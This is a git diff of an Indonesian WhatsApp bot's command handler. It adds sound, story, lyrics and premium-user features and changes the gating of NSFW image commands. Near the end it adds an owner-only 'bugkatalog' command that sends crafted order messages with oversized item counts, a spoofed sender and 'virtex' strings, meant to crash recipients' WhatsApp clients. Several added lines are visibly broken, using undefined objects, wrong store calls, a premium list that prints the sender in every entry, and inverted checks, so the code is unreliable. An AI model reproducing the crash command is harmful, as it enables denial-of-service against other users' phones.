@@ -77,6 +77,7 @@ Darkjokes } = require('dhn-api')
 const { getPosiMenu, getPosiCmd, getAnswerCmd, getPosiRows } = require("../lib/respon-list");
 const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("../lib/limit");
 const { aiovideodl } = require('../lib/scraper.js')
+const { cerpen } = require('../lib/cerpen')
 const _sewa = require('../lib/sewa')
 const { TiktokDownloader } = require('../lib/tiktokdl') 
 const { TelegraPh } = require ('../lib/uploader')
@@ -90,7 +91,8 @@ var image = fs.readFileSync('./image/zeroyt7.jpg')
 var thumbnail = fs.readFileSync('./image/thumbnail.jpg')
 
 let db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
-let { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('../lib/list.js')
+let { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('../lib/respon-list.js')
+const _prem = require("../lib/premium");
 
 //━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//
 const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
@@ -141,7 +143,7 @@ var isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
 var isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
 var isUser = pendaftar.includes(sender)
 var isSewa = _sewa.checkSewaGroup(from, sewa)
-var isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
+var isPremium = isCreator ? true : _prem.checkPremiumUser(sender, premium)
 //━━━━━━━━━━━━━━━[ FUNCTION ]━━━━━━━━━━━━━━━━━//
 
 try {
@@ -205,6 +207,35 @@ Fara.sendReadReceipt(from, m.sender, [m.key.id])
                     quoted: m
                 })
             }
+        }
+ function mentions(teks, mems = [], id) {
+        	if (id == null || id == undefined || id == false) {
+        	    let res = Fara.sendMessage(from, { text: teks, mentions: mems })
+        	    return res
+        	} else {
+                let res = Fara.sendMessage(from, { text: teks, mentions: mems }, { quoted: m})
+                return res
+            }
+        }
+        const reply = async(teks) => {
+		try {
+        ppuser = await Fara.profilePictureUrl(m.sender, 'image')
+        } catch (err) {
+        ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+        }
+        userpp = await getBuffer(ppuser)
+        Fara.sendMessage(m.chat, { text: teks, contextInfo:{ 
+        "forwardingScore":999,
+        "isForwarded":true, 
+        "mentionedJid": [m.sender], 
+        "externalAdReply" : { 
+        "title" : `Hallo Kak`, 
+        "body" : `Mampir Website Di Bawah Yaa`, 
+        "previewType" : "PHOTO", 
+        "thumbnailUrl" : ``, 
+        "thumbnail" : userpp, 
+        "sourceUrl": `https://chat.whatsapp.com/BABvK9nnhhJLImFXJaoLg9`}}}, 
+        { quoted: m })
         }
 //━━━━━━━━━━━━━━━[ PUBLIC & SELF ]━━━━━━━━━━━━━━━━━//
 
@@ -674,22 +705,6 @@ return {
 img: await resz.getBufferAsync(jimp.MIME_JPEG)
 }
 }
-
-        // Posi Store
-        if (m.type == "messageContextInfo" || m.type == "listResponseMessage" && isGroup) {
-            var posiStore = getPosiMenu(from, listStore)
-            if (posiStore !== null) {
-                var dataStore = listStore[posiStore].cmd
-                for (var i = 0; i < dataStore.length; i++) {
-                    if (body=== dataStore[i].menu) {
-                        m.reply(dataStore[i].harga)
-                    }
-                }
-            var posiCmd = getPosiCmd(body, dataStore)
-            if (posiCmd == null) m.reply(`${body} tidak terdaftar lagi di list`)
-            }
-        }
-        
 // Quoted
 const content = JSON.stringify(m.message)
 const isImage = (m.mtype == 'imageMessage')
@@ -774,6 +789,16 @@ sections: [{
                                                                             "rowId": `${prefix}stickeranime`
                                                                         },
                                                                         {
+                                                                        	"title": "Random Text Fitur",
+                                                                            "description": "Menampilan Fitur Random Text",
+                                                                            "rowId": `${prefix}randomtext`
+                                                                        },
+                                                                        {
+                                                                        	"title": "Random Cerpen Fitur",
+                                                                            "description": "Menampilan Fitur Random Cerpen",
+                                                                            "rowId": `${prefix}cerpenmenu`
+                                                                        },
+                                                                        {
                                                                         	"title": "Download Fitur",
                                                                             "description": "Menampilkan Fitur Download",
                                                                             "rowId": `${prefix}menudownload`
@@ -817,6 +842,11 @@ sections: [{
                                                                         	"title": "Sound Fitur",
                                                                             "description": "Menampilkan Fitur Sound",
                                                                             "rowId": `${prefix}menusound`
+                                                                        },
+                                                                        {
+                                                                        	"title": "Sound TikTok Fitur",
+                                                                            "description": "Menampilan Fitur Sound TikTok",
+                                                                            "rowId": `${prefix}soundtt`
                                                                         },
                                                                         {
                                                                         	"title": "Anime Fitur",
@@ -904,7 +934,7 @@ menuwh =`*OWNER MENU*
 • ${prefix}sendsession
 • ${prefix}public
 • ${prefix}self
-• ${prefix}addprem 
+• ${prefix}addprem
 • ${prefix}delprem
 • ${prefix}block
 • ${prefix}unblock
@@ -978,6 +1008,7 @@ menuwh =`*OTHER MENU*
 • ${prefix}runtime
 • ${prefix}hapus *reply cht*
 • ${prefix}ssweb
+• ${prefix}ringtone
 • ${prefix}shortlink
 • ${prefix}kalkulator
 • ${prefix}translate`
@@ -1205,6 +1236,172 @@ menuwh =`*SOUND MENU*
 • ${prefix}sound74`
 Fara.sendMessage(from, { caption: menuwh, location: { jpegThumbnail: thumbnail }, templateButtons: buttonFitur, footer: miyako, mentions: [sender] })
 break
+case 'soundtt':
+menuwh =`*SOUND TIKTOK MENU*
+
+• ${prefix}sound1
+• ${prefix}sound2
+• ${prefix}sound3
+• ${prefix}sound4
+• ${prefix}sound5
+• ${prefix}sound6
+• ${prefix}sound7
+• ${prefix}sound8
+• ${prefix}sound9
+• ${prefix}sound10
+• ${prefix}sound11
+• ${prefix}sound12
+• ${prefix}sound13
+• ${prefix}sound14
+• ${prefix}sound15
+• ${prefix}sound16
+• ${prefix}sound17
+• ${prefix}sound18
+• ${prefix}sound19
+• ${prefix}sound20
+• ${prefix}sound21
+• ${prefix}sound22
+• ${prefix}sound23
+• ${prefix}sound24
+• ${prefix}sound25
+• ${prefix}sound26
+• ${prefix}sound27
+• ${prefix}sound28
+• ${prefix}sound29
+• ${prefix}sound30
+• ${prefix}sound31
+• ${prefix}sound32
+• ${prefix}sound33
+• ${prefix}sound34
+• ${prefix}sound35
+• ${prefix}sound36
+• ${prefix}sound37
+• ${prefix}sound38
+• ${prefix}sound39
+• ${prefix}sound40
+• ${prefix}sound41
+• ${prefix}sound42
+• ${prefix}sound43
+• ${prefix}sound44
+• ${prefix}sound45
+• ${prefix}sound46
+• ${prefix}sound47
+• ${prefix}sound48
+• ${prefix}sound49
+• ${prefix}sound50
+• ${prefix}sound51
+• ${prefix}sound52
+• ${prefix}sound53
+• ${prefix}sound54
+• ${prefix}sound55
+• ${prefix}sound56
+• ${prefix}sound57
+• ${prefix}sound58
+• ${prefix}sound59
+• ${prefix}sound60
+• ${prefix}sound61
+• ${prefix}sound62
+• ${prefix}sound63
+• ${prefix}sound64
+• ${prefix}sound65
+• ${prefix}sound66
+• ${prefix}sound67
+• ${prefix}sound68
+• ${prefix}sound69
+• ${prefix}sound70
+• ${prefix}sound71
+• ${prefix}sound72
+• ${prefix}sound73
+• ${prefix}sound74
+• ${prefix}sound75
+• ${prefix}sound76
+• ${prefix}sound77
+• ${prefix}sound78
+• ${prefix}sound79
+• ${prefix}sound80
+• ${prefix}sound81
+• ${prefix}sound82
+• ${prefix}sound83
+• ${prefix}sound84
+• ${prefix}sound85
+• ${prefix}sound86
+• ${prefix}sound87
+• ${prefix}sound88
+• ${prefix}sound89
+• ${prefix}sound90
+• ${prefix}sound91
+• ${prefix}sound92
+• ${prefix}sound93
+• ${prefix}sound94
+• ${prefix}sound95
+• ${prefix}sound96
+• ${prefix}sound97
+• ${prefix}sound98
+• ${prefix}sound99
+• ${prefix}sound100
+• ${prefix}sound101
+• ${prefix}sound102
+• ${prefix}sound103
+• ${prefix}sound104
+• ${prefix}sound105
+• ${prefix}sound106
+• ${prefix}sound107
+• ${prefix}sound108
+• ${prefix}sound109
+• ${prefix}sound110
+• ${prefix}sound111
+• ${prefix}sound112
+• ${prefix}sound113
+• ${prefix}sound114
+• ${prefix}sound115
+• ${prefix}sound116
+• ${prefix}sound117
+• ${prefix}sound118
+• ${prefix}sound119
+• ${prefix}sound120
+• ${prefix}sound121
+• ${prefix}sound122
+• ${prefix}sound123
+• ${prefix}sound124
+• ${prefix}sound125
+• ${prefix}sound126
+• ${prefix}sound127
+• ${prefix}sound128
+• ${prefix}sound129
+• ${prefix}sound130
+• ${prefix}sound131
+• ${prefix}sound132
+• ${prefix}sound133
+• ${prefix}sound134
+• ${prefix}sound135
+• ${prefix}sound136
+• ${prefix}sound137
+• ${prefix}sound138
+• ${prefix}sound139
+• ${prefix}sound140
+• ${prefix}sound141
+• ${prefix}sound142
+• ${prefix}sound143
+• ${prefix}sound144
+• ${prefix}sound145
+• ${prefix}sound146
+• ${prefix}sound147
+• ${prefix}sound148
+• ${prefix}sound149
+• ${prefix}sound150
+• ${prefix}sound151
+• ${prefix}sound152
+• ${prefix}sound153
+• ${prefix}sound154
+• ${prefix}sound155
+• ${prefix}sound156
+• ${prefix}sound157
+• ${prefix}sound158
+• ${prefix}sound159
+• ${prefix}sound160
+• ${prefix}sound161`
+Fara.sendMessage(from, { caption: menuwh, location: { jpegThumbnail: thumbnail }, templateButtons: buttonFitur, footer: miyako, mentions: [sender] })
+break
 case 'stickeranime':
 menuwh =`*STICKER ANIME MENU*
 
@@ -1256,7 +1453,6 @@ menuwh =`*WIBU MENU*
 • ${prefix}blowjob
 • ${prefix}yaoi
 • ${prefix}ecchi
-• ${prefix}hentai
 • ${prefix}ahegao
 • ${prefix}hololewd
 • ${prefix}sideoppai
@@ -1294,7 +1490,6 @@ menuwh =`*WIBU MENU*
 • ${prefix}lewdk
 • ${prefix}femdom
 • ${prefix}cuddle
-• ${prefix}hentai
 • ${prefix}eroyuri
 • ${prefix}cum_jpg
 • ${prefix}blowjob
@@ -1362,6 +1557,77 @@ menuwh =`*ISLAM MENU*
 • ${prefix}iqro
 • ${prefix}juzamma
 • ${prefix}tafsirsurah`
+Fara.sendMessage(from, { caption: menuwh, location: { jpegThumbnail: thumbnail }, templateButtons: buttonFitur, footer: miyako, mentions: [sender] })
+break
+case 'randomtext':
+menuwh =`*RANDOM TEXT MENU*
+
+• ${prefix}cerpen
+• ${prefix}faktaunik
+• ${prefix}wattpad
+• ${prefix}wattpadsearch
+• ${prefix}lk21
+• ${prefix}quotes
+• ${prefix}quotesdilan
+• ${prefix}quotesanime
+• ${prefix}bucin
+• ${prefix}pantun
+• ${prefix}katabijak
+• ${prefix}ceritahoror`
+Fara.sendMessage(from, { caption: menuwh, location: { jpegThumbnail: thumbnail }, templateButtons: buttonFitur, footer: miyako, mentions: [sender] })
+break
+case 'cerpenmenu':
+menuwh =`*RANDOM CERPEN*
+
+• ${prefix}ceritahoror
+• ${prefix}cerpen-sejarah
+• ${prefix}cerpen-sedih
+• ${prefix}cerpen-sastra
+• ${prefix}cerpen-romantis
+• ${prefix}cerpen-rohani
+• ${prefix}cerpen-rindu
+• ${prefix}cerpen-remaja
+• ${prefix}cerpen-ramadhan
+• ${prefix}cerpen-petualangan
+• ${prefix}cerpen-persahabatan
+• ${prefix}cerpen-perpisahan
+• ${prefix}cerpen-perjuangan
+• ${prefix}cerpen-penyesalan
+• ${prefix}cerpen-pengorbanan
+• ${prefix}cerpen-pengalaman
+• ${prefix}cerpen-pendidikan
+• ${prefix}cerpen-penantian
+• ${prefix}cerpen-patahhati
+• ${prefix}cerpen-olahraga
+• ${prefix}cerpen-nasionalisme
+• ${prefix}cerpen-nasihat
+• ${prefix}cerpen-motivasi
+• ${prefix}cerpen-misteri
+• ${prefix}cerpen-mengharukan
+• ${prefix}cerpen-malaysia
+• ${prefix}cerpen-liburan
+• ${prefix}cerpen-kristen
+• ${prefix}cerpen-korea
+• ${prefix}cerpen-kisahnyata
+• ${prefix}cerpen-keluarga
+• ${prefix}cerpen-kehidupan
+• ${prefix}cerpen-jepang
+• ${prefix}cerpen-inspiratif
+• ${prefix}cerpen-gokil
+• ${prefix}cerpen-galau
+• ${prefix}cerpen-cintasejati
+• ${prefix}cerpen-cintasegitiga
+• ${prefix}cerpen-cintasedih
+• ${prefix}cerpen-cintaromantis
+• ${prefix}cerpen-cintapertama
+• ${prefix}cerpen-cintaislami
+• ${prefix}cerpen-cinta
+• ${prefix}cerpen-budaya
+• ${prefix}cerpen-bahasasunda
+• ${prefix}cerpen-bahasajawa
+• ${prefix}cerpen-bahasainggris
+• ${prefix}cerpen-bahasadaerah
+• ${prefix}cerpen-anak`
 Fara.sendMessage(from, { caption: menuwh, location: { jpegThumbnail: thumbnail }, templateButtons: buttonFitur, footer: miyako, mentions: [sender] })
 break
 case 'rules': case 'snk':
@@ -2664,7 +2930,7 @@ break
 case 'bc': case 'broadcast': case 'bcall': {
 if (!isCreator) throw mess.owner
 if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
-let anu = await store.chats.all().map(v => v.id)
+let anu = await store.body.all().map(v => v.id)
 m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
 for (let yoi of anu) {
 await sleep(1500)
@@ -2740,29 +3006,6 @@ Fara.send5ButImg(i, txt, creator, image, btn)
 }
 m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
 }
-break
-case 'addprem':
-if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
-bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
-premium.push(bnnd)
-fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
-m.reply(`Nomor ${bnnd} Telah Menjadi Premium!`)
-break
-case 'delprem':
-if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
-ya = `${args[0].replace('@', '')}@s.whatsapp.net`
-unp = premium.indexOf(ya)
-premium.splice(unp, 1)
-fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
-m.reply(`Nomor ${ya} Telah Di Hapus Premium!`)
-break
-case 'listpremium':
-teks = '*List Premium*\n\n'
-for (let Fara of premium) {
-teks += `- ${Fara}\n`
-}
-teks += `\n*Total : ${premium.length}*`
-Fara.sendMessage(from, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": premium } })
 break
 case 'setbiobot':{
 if (!isCreator) return m.reply(mess.owner)
@@ -2846,6 +3089,56 @@ case 'public': {
                 Fara.public = false
                 m.reply('Sukses Change To Self Usage')
             }
+            break
+            case 'addprem':
+            if (!isCreator && !m.from.key) return m.reply(mess.owner)
+            if (args.length < 1) return m.reply(`Gunakan dengan cara :\n${command} *@tag waktu*\n${command} *nomor waktu*\n\nContoh :\n${command} @tag 30d\n${command} 62895xxxxxxxx 30d`)
+            if (!args[0]) return m.reply(`Mau yang berapa hari?`)
+            if (mentionUser.length !== 0) {
+                addCountCmd('#addprem', sender, _cmd)
+                _prem.addPremiumUser(mentionUser[0], args[2], premium)
+                m.reply('Sukses')
+            } else {
+                var cekap = await Fara.onWhatsApp(args[0]+"@s.whatsapp.net")
+                if (cekap.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
+                addCountCmd('#addprem', sender, _cmd)
+                _prem.addPremiumUser(args[0]+'@s.whatsapp.net', args[1], premium)
+                m.reply('Sukses')
+            }
+            break
+            case 'delprem':
+            if (!isCreator && !m.from.key) return m.reply(mess.owner)
+            if (args.length < 1) return m.reply(`Gunakan dengan cara :\n${command} *@tag*\n${command} *nomor*\n\nContoh :\n${command} @tag\n${command} 62895xxxxxxxx`)
+            if (mentionUser.length !== 0){
+                addCountCmd('#delprem', sender, _cmd)
+                premium.splice(_prem.getPremiumPosition(mentionUser[0], premium), 1)
+                fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
+                m.reply('Sukses!')
+            } else {
+                var cekpr = await Fara.onWhatsApp(args[0]+"@s.whatsapp.net")
+                if (cekpr.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
+                addCountCmd('#delprem', sender, _cmd)
+                premium.splice(_prem.getPremiumPosition(args[1] + '@s.whatsapp.net', premium), 1)
+                fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
+                m.reply('Sukses!')
+            }
+            break
+case 'listpremium': case 'listprem':
+            addCountCmd('#listpremium', sender, _cmd)
+            let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
+            let men = [];
+            for (let i of premium) {
+                men.push(sender)
+                txt += `*ID :* @${sender.split("@")[0]}\n`
+                if (i.expired === 'PERMANENT') {
+                    let cekvip = 'PERMANENT'
+                    txt += `*Expire :* PERMANENT\n\n`
+                } else {
+                    let cekvip = ms(i.expired - Date.now())
+                    txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
+                }
+            }
+            mentions(txt, men, true)
             break
 case 'sewa':
 addCountCmd('#sewa', sender, _cmd)
@@ -2934,10 +3227,14 @@ case 'speedtest': {
             }
             }
             break
-case 'runtime':{
-await sendBut5nya(`*${runtime(process.uptime())}*`)
-}
-break
+case 'ringtone': {
+		if (!args.join(" ")) return reply(`Example:\n${prefix + command} black over`)
+        let { ringtone } = require('../lib/scraper')
+		let anu = await ringtone(text)
+		let result = anu[Math.floor(Math.random() * anu.length)]
+		Fara.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
+	    }
+	    break
 case 'kalkulator': case 'kal': {
 if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
 let qsd = args.join(" ")
@@ -2989,6 +3286,29 @@ case 'ssweb':
             axios.get(`https://api.lolhuman.xyz/api/ouoshortlink?apikey=${lolkey}&url=${args[0]}`).then(({ data }) => {
                 m.reply(data.result)
             })
+            break
+            case 'infobot': case 'info': case 'botinfo':
+            
+            const botNumber = Fara.user.id.split(':')[0] + '@s.whatsapp.net'
+            addCountCmd('#infobot', sender, _cmd)
+            var capt = `_*${botname} Information*_
+
+*• Name :* ${Fara.user.name}
+*• Number :* 
+*• Total Pengguna :* ${pendaftar.length}
+*• Prefix :* Multi Prefix
+*• Bot Created On 18 Juni 2020*
+
+_*Special Thanks To :*_
+*• Allah SWT*
+*• Adiwajshing/Baileys*
+*• Rintis ID*`
+            var buts = [
+                { urlButton: { displayText: `Instagram`, url: `https://www.instagram.com/rintiswpameling` } },
+                { quickReplyButton: { displayText: `Donasi`, id: prefix+'donate' } },
+                { quickReplyButton: { displayText: `Owner`, id: prefix+'dev' } }
+            ]
+            Fara.sendMessage(from, { image: thumbnail, caption: capt, footer: miyako, templateButtons: buts })
             break
 case 'translate':
 addCountCmd('#translate', sender, _cmd)
@@ -3162,17 +3482,40 @@ limitAdd(sender, limit)
 break
 
 //SEARCH MENU
-case 'lirik': case 'liriklagu':
-addCountCmd('#lirik', sender, _cmd)
-if (isLimit(sender, isPremium, isCreator, limitawal.free, limit)) return m.reply(mess.endLimit)
-                if (args.length < 1) return m.reply(`Kirim perintah ${command} judul lagu`)
-                m.reply(mess.wait)
-                ra.Musikmatch(q).then(async(data) => {
-                    var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
-                    Fara.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: m })
-                }).catch(() => m.reply(`Judul lagu tidak ditemukan`))
-                limitAdd(sender, limit)
-                break
+case 'lyrics': case 'lirik':{
+	    if (!text) return m.reply(`Use example ${prefix}lyrics Despacito`)
+	m.reply(mess.wait)
+	const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
+    const result = await lyricsv2(text).catch(async _ => await lyrics(text))
+    m.reply(`
+> Title : *${result.title}*
+> Author : ${result.author}
+> Lyrics : ${result.lyrics}
+> Url : ${result.link}
+`.trim())
+}
+break
+case 'gsmarena': {
+            if (!text) return reply(`Example : ${prefix + command} realme`)
+            let res = await fetchJson(`https://zenzapis.xyz/webzone/gsmarena?query=${text}&apikey=rintiscc`)
+            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
+let capt = `> Title: ${judul}
+> Realease: ${rilis}
+> Size: ${ukuran}
+> Type: ${type}
+> Storage: ${storage}
+> Display: ${display}
+> Inchi: ${inchi}
+> Pixel: ${pixel}
+> Video Pixel: ${videoPixel}
+> Ram: ${ram}
+> Chipset: ${chipset}
+> Battery: ${batrai}
+> Battery Brand: ${merek_batre}
+> Detail: ${detail}`
+            Fara.sendImage(m.chat, thumb, capt, m)
+            }
+            break
 case 'pinterest': {
 	addCountCmd('#pinterest', sender, _cmd)
 if (isLimit(sender, isPremium, isCreator, limitawal.free, limit)) return m.reply(mess.endLimit)
@@ -3631,63 +3974,6 @@ case 'd': case 'done':
             sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\n🛒 PRODUK : ${(args[1])}\`\`\`\n\nTerimakasih ${(args[0])}\n\nDi Tunggu Next Order Nya🙏`
             m.reply(sukses)
             break
-case 'addlist': case 'listadd':
-            if (!m.isGroup) return m.reply(mess.group)
-            if (!isAdmins && !isCerator) return m.reply(mess.admin)
-            var cekPos = getPosiMenu(from, listStore)
-            if (args.length < 1) return m.reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
-            if (!q.includes('@')) return m.reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
-            var menu = q.split('@')[0]
-            var harga = q.split('@')[1].replace(' ', ' ')
-            if (q.split('@').length > 1) {
-                harga = ''
-                var aoa = q.split('@')
-                for (let i of aoa) {
-                    if (i !== menu) harga += i
-                }
-            }
-            if (cekPos == null) {
-                var isi = {
-                    jid: from,
-                    cmd: [{ menu, harga }],
-                    sections: [
-                        {
-                            title: `${groupName}`,
-                            rows: [
-                                { title: menu, rowId: menu }
-                            ]
-                        }
-                    ]
-                }
-                listStore.push(isi)
-                fs.writeFileSync('./database/list.json', JSON.stringify(listStore, null, 2))
-                m.reply(`Sukses set list message dengan key : *${menu}*`)
-            } else {
-                var data1 = listStore[cekPos].cmd
-                var data2 = listStore[cekPos].sections[0].rows
-                var posCmd = getPosiCmd(menu, data1)
-                if (posCmd !== null) return m.reply(`Sukses set list message dengan key : *${menu}*`)
-                var isi1 = { menu, harga }
-                var isi2 = { title: menu, rowId: menu }
-                data1.push(isi1)
-                data2.push(isi2)
-                fs.writeFileSync('./database/list.json', JSON.stringify(listStore, null, 2))
-                m.reply(`Sukses set list message dengan key : *${menu}*`)
-            }
-            break
-case 'list':
-            if (!m.isGroup) return m.reply(mess.group)
-            var cekPosi = getPosiMenu(from, listStore)
-            if (cekPosi == null) return m.reply(`Belum ada list message yang terdaftar di group ini`)
-            var data = listStore[cekPosi]
-            var listMsg = {
-                text: "Silahkan Pilih Produk Nya",
-                buttonText: "Click Here!",
-                footer: `Rintis ID`,
-                sections: data.sections
-            }
-            Fara.sendMessage(from, listMsg)
-            break
 //DATABASE MENU
 case 'addmsg': {
                 if (!m.quoted) return m.reply('Reply Message Yang Ingin Disave Di Database')
@@ -4130,6 +4416,171 @@ inicdd = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/sou
 Fara.sendMessage(m.chat, {audio: inicdd, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
 limitAdd(sender, limit)
 break
+case 'sound1':
+case 'sound2':
+case 'sound3':
+case 'sound4':
+case 'sound5':
+case 'sound6':
+case 'sound7':
+case 'sound8':
+case 'sound9':
+case 'sound10':
+case 'sound11':
+case 'sound12':
+case 'sound13':
+case 'sound14':
+case 'sound15':
+case 'sound16':
+case 'sound17':
+case 'sound18':
+case 'sound19':
+case 'sound20':
+case 'sound21':
+case 'sound22':
+case 'sound23':
+case 'sound24':
+case 'sound25':
+case 'sound26':
+case 'sound27':
+case 'sound28':
+case 'sound29':
+case 'sound30':
+case 'sound31':
+case 'sound32':
+case 'sound33':
+case 'sound34':
+case 'sound35':
+case 'sound36':
+case 'sound37':
+case 'sound38':
+case 'sound39':
+case 'sound40':
+case 'sound41':
+case 'sound42':
+case 'sound43':
+case 'sound44':
+case 'sound45':
+case 'sound46':
+case 'sound47':
+case 'sound48':
+case 'sound49':
+case 'sound50':
+case 'sound51':
+case 'sound52':
+case 'sound53':
+case 'sound54':
+case 'sound55':
+case 'sound56':
+case 'sound57':
+case 'sound58':
+case 'sound59':
+case 'sound60':
+case 'sound61':
+case 'sound62':
+case 'sound63':
+case 'sound64':
+case 'sound65':
+case 'sound66':
+case 'sound67':
+case 'sound68':
+case 'sound69':
+case 'sound70':
+case 'sound71':
+case 'sound72':
+case 'sound73':
+case 'sound74':
+case 'sound75':
+case 'sound76':
+case 'sound77':
+case 'sound78':
+case 'sound79':
+case 'sound80':
+case 'sound81':
+case 'sound82':
+case 'sound83':
+case 'sound84':
+case 'sound85':
+case 'sound86':
+case 'sound87':
+case 'sound88':
+case 'sound89':
+case 'sound90':
+case 'sound91':
+case 'sound92':
+case 'sound93':
+case 'sound94':
+case 'sound95':
+case 'sound96':
+case 'sound97':
+case 'sound98':
+case 'sound99':
+case 'sound100':
+case 'sound101':
+case 'sound102':
+case 'sound103':
+case 'sound104':
+case 'sound105':
+case 'sound106':
+case 'sound107':
+case 'sound108':
+case 'sound109':
+case 'sound110':
+case 'sound111':
+case 'sound112':
+case 'sound113':
+case 'sound114':
+case 'sound115':
+case 'sound116':
+case 'sound117':
+case 'sound118':
+case 'sound119':
+case 'sound120':
+case 'sound121':
+case 'sound122':
+case 'sound123':
+case 'sound124':
+case 'sound125':
+case 'sound126':
+case 'sound127':
+case 'sound128':
+case 'sound129':
+case 'sound130':
+case 'sound131':
+case 'sound132':
+case 'sound133':
+case 'sound134':
+case 'sound135':
+case 'sound136':
+case 'sound137':
+case 'sound138':
+case 'sound139':
+case 'sound140':
+case 'sound141':
+case 'sound142':
+case 'sound143':
+case 'sound144':
+case 'sound145':
+case 'sound146':
+case 'sound147':
+case 'sound148':
+case 'sound149':
+case 'sound150':
+case 'sound151':
+case 'sound152':
+case 'sound153':
+case 'sound154':
+case 'sound155':
+case 'sound156':
+case 'sound157':
+case 'sound158':
+case 'sound159':
+case 'sound160':
+case 'sound161':
+reply(mess.wait)
+xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
+await Fara.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
+break
 
 //NSFW MENU
 case 'hentai':
@@ -4150,7 +4601,7 @@ case 'panties':
 case 'pussy':
 case 'thighs':
 case 'yuri':{
-if (!isPremium && isCreator) return m.reply(mess.premium)
+if (!m.isPremium && !isCreator) return m.reply(mess.premium)
 m.reply(mess.wait)
 let cndn = await fetchJson(`https://raw.githubusercontent.com/jepribarus/JB-Api/main/nsfw/${command}.json`)
 let random = cndn[Math.floor(Math.random() * cndn.length)]
@@ -4163,7 +4614,7 @@ case 'husbu':
 case 'milf':
 case 'cosplay':
 case 'wallml':{
-if (!isPremium && isCreator) return m.reply(mess.premium)
+if (!m.isPremium) return m.reply(mess.premium)
 m.reply(mess.wait)
 let eek = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)
 let random = eek[Math.floor(Math.random() * eek.length)]
@@ -4241,6 +4692,7 @@ case 'handhold':
         case 'biganimetiddies':
         case 'animebellybutton':
         case 'hentai4everyone':
+        if (!isPremium && isCreator) return m.reply(mess.premium)
             Fara.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}` } })
             break
 
@@ -4560,6 +5012,445 @@ let txt = `ã€Œ *Tafsir Surah* ã€
 
 ( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
 m.reply(txt)
+}
+break
+case 'bugkatalog':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+itsmevall.toggleDisappearingMessages(from, 0)
+ babi = (teks) => {
+             res = itsmevall.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
+  key: {
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+   orderMessage: {
+    itemCount: 9999999, // Bug
+    status: 1,
+    surface: 1,
+    message: `${virtex6(prefix)}`,
+    orderTitle: `${emoji2(prefix)}`, // Idk what this does
+    sellerJid: '0@s.whatsapp.net' // Seller
+   }
+  }
+ }
+})
+             itsmevall.relayWAMessage(res)
+        }
+        babi(`${ngazap(prefix)}`)
+        babi(`${virtag(prefix)}`)
+        babi(`${virtex6(prefix)}`)
+        babi(`${emoji2(prefix)}`)
+        break
+        case 'list':
+            if (!isGroup) return m.reply(mess.group)
+            if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
+            if (!isAlreadyResponListGroup(from, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
+            var arr_rows = [];
+            for (let x of db_respon_list) {
+                if (x.id === from) {
+                    arr_rows.push({
+                        title: x.key,
+                        rowId: x.key
+                    })
+                }
+            }
+            var listMsg = {
